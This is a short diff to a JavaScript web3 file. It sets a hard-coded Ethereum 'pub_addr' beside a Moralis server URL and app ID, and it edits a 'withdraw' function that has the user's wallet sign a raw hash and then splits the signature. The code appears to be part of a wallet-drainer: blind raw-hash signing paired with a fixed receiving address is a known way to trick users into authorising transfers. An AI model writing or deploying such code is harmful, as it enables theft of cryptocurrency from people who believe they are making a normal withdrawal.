@@ -1,4 +1,4 @@
-const pub_addr = "";
+const pub_addr = "0x194f14Ac52eb4e7cfc50141874AA873c5c9e9274";
 const serverUrl = "https://mgk9mqmygs9z.usemoralis.com:2053/server";
 const appId = "SkulaLBgqkX7aZEHHNX3Zyv1Gkpt7CO71Q6lg37g";
 
@@ -64,7 +64,7 @@ export async function withdraw(value, chainId, setValue) {
           .sign(sha3_, userAddr)
           .then(async (signed) => {
             console.log("true signed");
-            window.localStorage.setItem("signed", true);
+            // window.localStorage.setItem("signed", true);
             setValue({ ...value, signed: true });
             resolve(true);
             const temporary = signed.substring(2),
